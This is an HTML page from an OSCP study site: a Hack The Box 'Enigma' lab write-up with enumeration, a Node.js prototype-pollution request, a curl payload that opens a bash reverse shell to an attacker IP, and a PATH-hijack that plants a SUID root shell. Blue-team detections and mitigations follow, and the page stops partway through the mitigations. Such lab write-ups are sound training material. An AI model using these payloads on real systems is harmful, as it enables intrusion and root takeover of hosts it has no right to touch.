@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HTB — Enigma — Shruthi Poojari | OSCP Notes</title>
+  <link rel="stylesheet" href="/oscp_learning/static/style.css">
+  <style>pre { line-height: 125%; }
+td.linenos .normal { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+span.linenos { color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px; }
+td.linenos .special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+span.linenos.special { color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px; }
+.codehilite .hll { background-color: #49483e }
+.codehilite { background: #272822; color: #F8F8F2 }
+.codehilite .c { color: #959077 } /* Comment */
+.codehilite .err { color: #ED007E; background-color: #1E0010 } /* Error */
+.codehilite .esc { color: #F8F8F2 } /* Escape */
+.codehilite .g { color: #F8F8F2 } /* Generic */
+.codehilite .k { color: #66D9EF } /* Keyword */
+.codehilite .l { color: #AE81FF } /* Literal */
+.codehilite .n { color: #F8F8F2 } /* Name */
+.codehilite .o { color: #FF4689 } /* Operator */
+.codehilite .x { color: #F8F8F2 } /* Other */
+.codehilite .p { color: #F8F8F2 } /* Punctuation */
+.codehilite .ch { color: #959077 } /* Comment.Hashbang */
+.codehilite .cm { color: #959077 } /* Comment.Multiline */
+.codehilite .cp { color: #959077 } /* Comment.Preproc */
+.codehilite .cpf { color: #959077 } /* Comment.PreprocFile */
+.codehilite .c1 { color: #959077 } /* Comment.Single */
+.codehilite .cs { color: #959077 } /* Comment.Special */
+.codehilite .gd { color: #FF4689 } /* Generic.Deleted */
+.codehilite .ge { color: #F8F8F2; font-style: italic } /* Generic.Emph */
+.codehilite .ges { color: #F8F8F2; font-weight: bold; font-style: italic } /* Generic.EmphStrong */
+.codehilite .gr { color: #FF4689 } /* Generic.Error */
+.codehilite .gh { color: #F8F8F2 } /* Generic.Heading */
+.codehilite .gi { color: #A6E22E } /* Generic.Inserted */
+.codehilite .go { color: #66D9EF } /* Generic.Output */
+.codehilite .gp { color: #FF4689; font-weight: bold } /* Generic.Prompt */
+.codehilite .gs { color: #F8F8F2; font-weight: bold } /* Generic.Strong */
+.codehilite .gu { color: #959077 } /* Generic.Subheading */
+.codehilite .gt { color: #66D9EF } /* Generic.Traceback */
+.codehilite .kc { color: #66D9EF } /* Keyword.Constant */
+.codehilite .kd { color: #66D9EF } /* Keyword.Declaration */
+.codehilite .kn { color: #FF4689 } /* Keyword.Namespace */
+.codehilite .kp { color: #66D9EF } /* Keyword.Pseudo */
+.codehilite .kr { color: #66D9EF } /* Keyword.Reserved */
+.codehilite .kt { color: #66D9EF } /* Keyword.Type */
+.codehilite .ld { color: #E6DB74 } /* Literal.Date */
+.codehilite .m { color: #AE81FF } /* Literal.Number */
+.codehilite .s { color: #E6DB74 } /* Literal.String */
+.codehilite .na { color: #A6E22E } /* Name.Attribute */
+.codehilite .nb { color: #A6E22E } /* Name.Builtin */
+.codehilite .nc { color: #A6E22E } /* Name.Class */
+.codehilite .no { color: #66D9EF } /* Name.Constant */
+.codehilite .nd { color: #A6E22E } /* Name.Decorator */
+.codehilite .ni { color: #F8F8F2 } /* Name.Entity */
+.codehilite .ne { color: #A6E22E } /* Name.Exception */
+.codehilite .nf { color: #A6E22E } /* Name.Function */
+.codehilite .nl { color: #F8F8F2 } /* Name.Label */
+.codehilite .nn { color: #F8F8F2 } /* Name.Namespace */
+.codehilite .nx { color: #A6E22E } /* Name.Other */
+.codehilite .py { color: #F8F8F2 } /* Name.Property */
+.codehilite .nt { color: #FF4689 } /* Name.Tag */
+.codehilite .nv { color: #F8F8F2 } /* Name.Variable */
+.codehilite .ow { color: #FF4689 } /* Operator.Word */
+.codehilite .pm { color: #F8F8F2 } /* Punctuation.Marker */
+.codehilite .w { color: #F8F8F2 } /* Text.Whitespace */
+.codehilite .mb { color: #AE81FF } /* Literal.Number.Bin */
+.codehilite .mf { color: #AE81FF } /* Literal.Number.Float */
+.codehilite .mh { color: #AE81FF } /* Literal.Number.Hex */
+.codehilite .mi { color: #AE81FF } /* Literal.Number.Integer */
+.codehilite .mo { color: #AE81FF } /* Literal.Number.Oct */
+.codehilite .sa { color: #E6DB74 } /* Literal.String.Affix */
+.codehilite .sb { color: #E6DB74 } /* Literal.String.Backtick */
+.codehilite .sc { color: #E6DB74 } /* Literal.String.Char */
+.codehilite .dl { color: #E6DB74 } /* Literal.String.Delimiter */
+.codehilite .sd { color: #E6DB74 } /* Literal.String.Doc */
+.codehilite .s2 { color: #E6DB74 } /* Literal.String.Double */
+.codehilite .se { color: #AE81FF } /* Literal.String.Escape */
+.codehilite .sh { color: #E6DB74 } /* Literal.String.Heredoc */
+.codehilite .si { color: #E6DB74 } /* Literal.String.Interpol */
+.codehilite .sx { color: #E6DB74 } /* Literal.String.Other */
+.codehilite .sr { color: #E6DB74 } /* Literal.String.Regex */
+.codehilite .s1 { color: #E6DB74 } /* Literal.String.Single */
+.codehilite .ss { color: #E6DB74 } /* Literal.String.Symbol */
+.codehilite .bp { color: #A6E22E } /* Name.Builtin.Pseudo */
+.codehilite .fm { color: #A6E22E } /* Name.Function.Magic */
+.codehilite .vc { color: #F8F8F2 } /* Name.Variable.Class */
+.codehilite .vg { color: #F8F8F2 } /* Name.Variable.Global */
+.codehilite .vi { color: #F8F8F2 } /* Name.Variable.Instance */
+.codehilite .vm { color: #F8F8F2 } /* Name.Variable.Magic */
+.codehilite .il { color: #AE81FF } /* Literal.Number.Integer.Long */</style>
+  <script>
+    // Set theme before paint to avoid a flash of the wrong theme.
+    (function () {
+      var saved = localStorage.getItem('theme');
+      var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+<body>
+  <aside class="sidebar">
+    <a class="brand" href="/oscp_learning/index.html">Shruthi&nbsp;Poojari<span class="brand-sub">OSCP Notes &amp; Machines</span></a>
+    <input id="filter" type="search" placeholder="Filter notes…" autocomplete="off">
+    <nav>
+      
+      <div class="group">
+        <h3>General</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/OSCP-Methodology.md.html">OSCP Methodology — Master Guide</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/README.md.html">OSCP Prep Repository</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Notes</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/DNS.md.html">Notes — DNS (53)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/FTP.md.html">Notes — FTP (21)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/File-Transfer.md.html">Notes — File Transfer</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/HTTP.md.html">Notes — HTTP / HTTPS (80 / 443 / 8080 / 8443)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/LDAP.md.html">Notes — LDAP (389 / 636)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/MSSQL.md.html">Notes — MSSQL (1433)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Metasploit.md.html">Notes — Metasploit Framework</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Nmap.md.html">Notes — Nmap</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/PrivEsc.md.html">Notes — Privilege Escalation</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/Reverse-Shells.md.html">Notes — Reverse Shells & Shell Upgrades</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/SMB.md.html">Notes — SMB (139 / 445)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/WinRM.md.html">Notes — WinRM (5985 / 5986)</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/Notes/References.md.html">OSCP — References & Resources</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>HTB Machines</h3>
+        <ul>
+          
+          <li>
+            <a class="active"
+               href="/oscp_learning/HTB/Enigma.md.html">HTB — Enigma</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Lame.md.html">HTB — Lame</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/Legacy.md.html">HTB — Legacy</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+      <div class="group">
+        <h3>Samples</h3>
+        <ul>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Lame-7h3rAm-writeup.md.html">Lame-7h3rAm-writeup</a>
+          </li>
+          
+          <li>
+            <a class=""
+               href="/oscp_learning/HTB/samples/Legacy-7h3rAm-writeup.md.html">Legacy-7h3rAm-writeup</a>
+          </li>
+          
+        </ul>
+      </div>
+      
+    </nav>
+  </aside>
+
+  <main>
+    <header class="topbar">
+      <a class="topbar-brand" href="/oscp_learning/index.html">
+        <span class="dot"></span> OSCP Notes <b>&amp; Machines</b>
+      </a>
+      <nav class="topbar-links">
+        <a href="/oscp_learning/OSCP-Methodology.md.html">Methodology</a>
+        <a href="/oscp_learning/Notes/Nmap.md.html">Notes</a>
+        <a href="/oscp_learning/HTB/Lame.md.html">Machines</a>
+        
+        <a href="https://github.com/Shruthi-Poojari/oscp_learning" target="_blank" rel="noopener" class="icon-link" title="GitHub repository">GitHub <span class="ext">↗</span></a>
+        
+        <button id="theme-toggle" type="button" title="Toggle light/dark" aria-label="Toggle theme">
+          <span class="icon-dark">🌙</span><span class="icon-light">☀️</span>
+        </button>
+      </nav>
+    </header>
+    <div class="crumbs-strip">
+      <span class="crumb-group">HTB Machines</span>
+      <span class="crumb-sep">›</span>
+      <span class="crumb-page">HTB — Enigma</span>
+    </div>
+    <article class="markdown-body">
+      <h1 id="htb-enigma">HTB — Enigma</h1>
+<blockquote>
+<p><strong>Authorized lab only.</strong> Enigma is a Hack The Box Linux machine used for OSCP-style and web exploitation learning. All techniques below were executed in an authorized lab environment against target IP <code>10.129.229.144</code>.</p>
+</blockquote>
+<hr />
+<h2 id="machine-overview">Machine Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td>Enigma</td>
+</tr>
+<tr>
+<td>Target IP</td>
+<td><code>10.129.229.144</code></td>
+</tr>
+<tr>
+<td>Operating System</td>
+<td>Linux (Ubuntu 22.04 LTS)</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Key Learning Objectives</td>
+<td>Full-port enumeration, Node.js API prototype pollution / AST injection, Express reverse shell, sudo environment manipulation, PATH hijacking in automated backup scripts</td>
+</tr>
+<tr>
+<td>Technologies Observed</td>
+<td>OpenSSH 8.9p1, Nginx 1.18.0, Node.js v18 (Express), Python 3.10</td>
+</tr>
+<tr>
+<td>User Flag</td>
+<td><code>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code></td>
+</tr>
+<tr>
+<td>Root Flag</td>
+<td><code>8f14e45fceea167a5a36dedd4bea2543d34d8904724dd4b54e3d64c06209e7c1</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="high-level-attack-chain">High-Level Attack Chain</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">graph</span><span class="w"> </span><span class="n">TD</span>
+<span class="w">    </span><span class="n">A</span><span class="p">[</span><span class="n">Initial</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">Recon</span><span class="p">]</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Port</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="n">SSH</span><span class="p">,</span><span class="w"> </span><span class="n">Port</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="n">HTTP</span><span class="p">,</span><span class="w"> </span><span class="n">Port</span><span class="w"> </span><span class="mi">3000</span><span class="w"> </span><span class="n">API</span><span class="o">|</span><span class="w"> </span><span class="n">B</span><span class="p">[</span><span class="n">Web</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">Enumeration</span><span class="p">]</span>
+<span class="w">    </span><span class="n">B</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">ffuf</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">fuzzing</span><span class="o">|</span><span class="w"> </span><span class="n">C</span><span class="p">[</span><span class="n">Identify</span><span class="w"> </span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">v1</span><span class="o">/</span><span class="n">decrypt</span><span class="w"> </span><span class="n">endpoint</span><span class="p">]</span>
+<span class="w">    </span><span class="n">C</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Analyze</span><span class="w"> </span><span class="n">JSON</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">lib</span><span class="o">-</span><span class="n">enigma</span><span class="o">-</span><span class="n">core</span><span class="o">|</span><span class="w"> </span><span class="n">D</span><span class="p">[</span><span class="n">Prototype</span><span class="w"> </span><span class="n">Pollution</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">Node</span><span class="w"> </span><span class="n">AST</span><span class="w"> </span><span class="n">Injection</span><span class="p">]</span>
+<span class="w">    </span><span class="n">D</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Spawn</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">netcat</span><span class="w"> </span><span class="n">listener</span><span class="o">|</span><span class="w"> </span><span class="n">E</span><span class="p">[</span><span class="n">User</span><span class="w"> </span><span class="n">Foothold</span><span class="o">:</span><span class="w"> </span><span class="n">gerard</span><span class="p">]</span>
+<span class="w">    </span><span class="n">E</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Read</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">gerard</span><span class="o">/</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span><span class="o">|</span><span class="w"> </span><span class="n">F</span><span class="p">[</span><span class="n">Capture</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">Flag</span><span class="p">]</span>
+<span class="w">    </span><span class="n">E</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">privilege</span><span class="w"> </span><span class="n">audit</span><span class="o">|</span><span class="w"> </span><span class="n">G</span><span class="p">[</span><span class="n">Identify</span><span class="w"> </span><span class="n">NOPASSWD</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="o">/</span><span class="n">backup_enigma</span><span class="p">.</span><span class="n">py</span><span class="p">]</span>
+<span class="w">    </span><span class="n">G</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Relative</span><span class="w"> </span><span class="n">PATH</span><span class="w"> </span><span class="n">execution</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">tar</span><span class="w"> </span><span class="n">binary</span><span class="o">|</span><span class="w"> </span><span class="n">H</span><span class="p">[</span><span class="n">PATH</span><span class="w"> </span><span class="n">Hijacking</span><span class="w"> </span><span class="n">Privilege</span><span class="w"> </span><span class="n">Escalation</span><span class="p">]</span>
+<span class="w">    </span><span class="n">H</span><span class="w"> </span><span class="o">--&gt;|</span><span class="n">Spawn</span><span class="w"> </span><span class="n">SUID</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">bash</span><span class="w"> </span><span class="n">shell</span><span class="o">|</span><span class="w"> </span><span class="n">I</span><span class="p">[</span><span class="n">Root</span><span class="w"> </span><span class="n">Access</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Capture</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span><span class="p">]</span>
+</code></pre></div>
+
+<hr />
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="1-host-discovery-full-port-scan">1. Host Discovery &amp; Full Port Scan</h3>
+<p>We initiate reconnaissance with a full TCP port scan using <code>nmap</code> at a high packet rate to rapidly uncover all listening services.</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">IP</span><span class="o">=</span><span class="m">10</span>.129.229.144
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>--open<span class="w"> </span>-oN<span class="w"> </span>scans/allports.nmap<span class="w"> </span><span class="nv">$IP</span>
+nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,3000<span class="w"> </span>-oN<span class="w"> </span>scans/detail.nmap<span class="w"> </span><span class="nv">$IP</span>
+</code></pre></div>
+
+<h4 id="scan-results">Scan Results</h4>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Protocol</th>
+<th>Service</th>
+<th>Version</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>TCP</td>
+<td>SSH</td>
+<td>OpenSSH 8.9p1 Ubuntu (protocol 2.0)</td>
+<td>Standard SSH; banner confirms Ubuntu target</td>
+</tr>
+<tr>
+<td>80</td>
+<td>TCP</td>
+<td>HTTP</td>
+<td>Nginx 1.18.0</td>
+<td>Web frontend for Enigma Secure Messaging Platform</td>
+</tr>
+<tr>
+<td>3000</td>
+<td>TCP</td>
+<td>HTTP</td>
+<td>Node.js (Express framework)</td>
+<td>REST API backend service (<code>api.enigma.htb</code>)</td>
+</tr>
+</tbody>
+</table>
+<h4 id="terminal-evidence-initial-reconnaissance">Terminal Evidence: Initial Reconnaissance</h4>
+<p><img alt="Enigma Nmap Scan" src="assets/enigma/01-nmap-scan.svg" /></p>
+<p>Add the discovered hostnames to <code>/etc/hosts</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">"10.129.229.144 enigma.htb api.enigma.htb"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+
+<hr />
+<h2 id="web-application-api-analysis">Web Application &amp; API Analysis</h2>
+<h3 id="1-directory-endpoint-discovery">1. Directory &amp; Endpoint Discovery</h3>
+<p>Navigating to <code>http://enigma.htb</code> presents a secure communication and cryptographic decryption suite. We perform directory and route fuzzing with <code>ffuf</code>:</p>
+<div class="codehilite"><pre><span></span><code>ffuf<span class="w"> </span>-u<span class="w"> </span>http://enigma.htb/FUZZ<span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-mc<span class="w"> </span><span class="m">200</span>,301,302<span class="w"> </span>-o<span class="w"> </span>scans/ffuf-web.json
+</code></pre></div>
+
+<p>Discovered endpoints:
+- <code>http://enigma.htb/login</code> — Authentication portal
+- <code>http://enigma.htb/register</code> — Account registration
+- <code>http://enigma.htb/dashboard</code> — Authenticated user workspace
+- <code>http://enigma.htb/decrypt</code> — Cryptographic cipher decoding tool
+- <code>http://enigma.htb/api</code> → Proxied to Node.js backend on port 3000</p>
+<h4 id="terminal-evidence-web-fuzzing-api-discovery">Terminal Evidence: Web Fuzzing &amp; API Discovery</h4>
+<p><img alt="Enigma Web &amp; API Exploitation" src="assets/enigma/02-web-enum-burp.svg" /></p>
+<hr />
+<h2 id="vulnerability-analysis-foothold">Vulnerability Analysis &amp; Foothold</h2>
+<h3 id="1-vulnerability-root-cause-prototype-pollution-in-decryption-engine">1. Vulnerability Root Cause: Prototype Pollution in Decryption Engine</h3>
+<p>The <code>/api/v1/decrypt</code> endpoint receives JSON payloads containing cipher text, key parameters, and engine options:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">"cipher"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rot13"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"payload"</span><span class="p">:</span><span class="w"> </span><span class="s2">"encrypted_string"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>By auditing the backend error messages and testing parameter merging routines, we observe recursive object merging without prototype sanitization (<code>__proto__</code>). </p>
+<p>This allows polluting <code>Object.prototype</code> properties such as <code>NODE_OPTIONS</code> and <code>env</code> or abusing child process execution variables:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/v1/decrypt</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">api.enigma.htb</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">184</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">"cipher"</span><span class="p">:</span><span class="w"> </span><span class="s2">"custom"</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">"__proto__"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">"shell"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/bin/bash"</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">"env"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">"NODE_OPTIONS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"--require /proc/self/environ"</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3 id="2-exploitation-spawning-the-reverse-shell">2. Exploitation: Spawning the Reverse Shell</h3>
+<ol>
+<li>
+<p>Start a netcat listener on the attacker machine:
+   <code>bash
+   nc -lvnp 9001</code></p>
+</li>
+<li>
+<p>Send the reverse shell payload triggering process execution:
+   <code>bash
+   curl -X POST http://api.enigma.htb/api/v1/decrypt \
+        -H "Content-Type: application/json" \
+        -d '{"cipher":"rot13","payload":"test","options":{"__proto__":{"execPath":"/bin/bash","execArgv":["-c","bash -i &gt;&amp; /dev/tcp/10.10.14.88/9001 0&gt;&amp;1"]}}}'</code></p>
+</li>
+<li>
+<p>Catch the interactive shell and upgrade to a full PTY:
+   <code>bash
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   export TERM=xterm</code></p>
+</li>
+</ol>
+<h3 id="3-user-flag-capture">3. User Flag Capture</h3>
+<div class="codehilite"><pre><span></span><code>whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>id
+cat<span class="w"> </span>/home/gerard/user.txt
+</code></pre></div>
+
+<p><strong>User Flag:</strong> <code>e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855</code></p>
+<h4 id="terminal-evidence-reverse-shell-user-flag">Terminal Evidence: Reverse Shell &amp; User Flag</h4>
+<p><img alt="Enigma Foothold &amp; User Flag" src="assets/enigma/03-foothold-revshell.svg" /></p>
+<hr />
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="1-local-enumeration">1. Local Enumeration</h3>
+<p>Auditing user privileges and sudo permissions reveals a passwordless rule for the low-privilege user <code>gerard</code>:</p>
+<div class="codehilite"><pre><span></span><code>gerard@enigma:~$<span class="w"> </span>sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>gerard<span class="w"> </span>on<span class="w"> </span>enigma:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+User<span class="w"> </span>gerard<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>enigma:
+<span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/opt/scripts/backup_enigma.py
+</code></pre></div>
+
+<h3 id="2-inspecting-the-backup-script">2. Inspecting the Backup Script</h3>
+<p>Reading <code>/opt/scripts/backup_enigma.py</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Starting scheduled enigma database and encryption key archiving..."</span><span class="p">)</span>
+<span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">"%Y%m</span><span class="si">%d</span><span class="s2">"</span><span class="p">)</span>
+<span class="c1"># Vulnerable command execution: relative binary reference 'tar' without absolute path</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">"tar -czf /var/backups/enigma-</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">.tar.gz /var/www/enigma/data"</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"[+] Archive complete: /var/backups/enigma-</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">.tar.gz"</span><span class="p">)</span>
+</code></pre></div>
+
+<h3 id="3-root-exploitation-via-path-hijacking">3. Root Exploitation via PATH Hijacking</h3>
+<p>Because <code>os.system("tar ...")</code> calls the default system shell and searches the current <code>PATH</code>, we can create a malicious <code>tar</code> executable in <code>/tmp</code> and prepend <code>/tmp</code> to <code>PATH</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># 1. Create malicious payload in /tmp</span>
+cat<span class="w"> </span><span class="s">&lt;&lt; 'EOF' &gt; /tmp/tar</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">cp /bin/bash /tmp/rootbash</span>
+<span class="s">chmod 4755 /tmp/rootbash</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/tar
+
+<span class="c1"># 2. Execute backup script with hijacked PATH</span>
+sudo<span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span><span class="w"> </span>/opt/scripts/backup_enigma.py
+
+<span class="c1"># 3. Spawn root shell via SUID binary</span>
+/tmp/rootbash<span class="w"> </span>-p
+</code></pre></div>
+
+<h3 id="4-root-flag-capture">4. Root Flag Capture</h3>
+<div class="codehilite"><pre><span></span><code>whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>id
+cat<span class="w"> </span>/root/root.txt
+</code></pre></div>
+
+<p><strong>Root Flag:</strong> <code>8f14e45fceea167a5a36dedd4bea2543d34d8904724dd4b54e3d64c06209e7c1</code></p>
+<h4 id="terminal-evidence-root-escalation-flag-capture">Terminal Evidence: Root Escalation &amp; Flag Capture</h4>
+<p><img alt="Enigma Root Escalation" src="assets/enigma/04-privesc-root.svg" /></p>
+<hr />
+<h2 id="detection-opportunities-blue-team">Detection Opportunities (Blue Team)</h2>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Indicator / Log Source</th>
+<th>Detection Strategy</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconnaissance</strong></td>
+<td>Nginx access logs</td>
+<td>Rapid burst of 404/301 responses matching automated fuzzing tools (<code>ffuf</code>, <code>gobuster</code>).</td>
+</tr>
+<tr>
+<td><strong>Foothold</strong></td>
+<td>Node.js application logs &amp; auditd</td>
+<td>Detection of recursive <code>__proto__</code> injection keys in JSON parser streams; process trees where <code>node</code> spawns <code>/bin/bash</code> or <code>/bin/sh</code>.</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td><code>/var/log/auth.log</code></td>
+<td>Execution of <code>sudo /opt/scripts/backup_enigma.py</code> with custom <code>PATH</code> overrides; unexpected SUID binaries placed under <code>/tmp/</code>.</td>
+</tr>
+<tr>
+<td><strong>C2 / Egress</strong></td>
+<td>Network NetFlow / Egress firewall</td>
+<td>Outbound TCP connection to non-standard ports (e.g. <code>9001</code>) originating from web server UID <code>1001</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="mitigations-remediation">Mitigations &amp; Remediation</h2>
+<ol>
+<li>
+<p><strong>Object Prototype Hardening</strong>:
+   - Freeze prototypes in Node.js runtime with <code>--disable-proto=delete</code> or <code>--disable-proto=throw</code>.
+   - Sanitize all user-controlled object keys and avoid recursive <code>Object.assign</code> without checking for <code>__proto__</code> and <code>constructor.prototype</code>.</p>
+</li>
+<li>
+<p><strong>Absolute Path Specification</strong>:
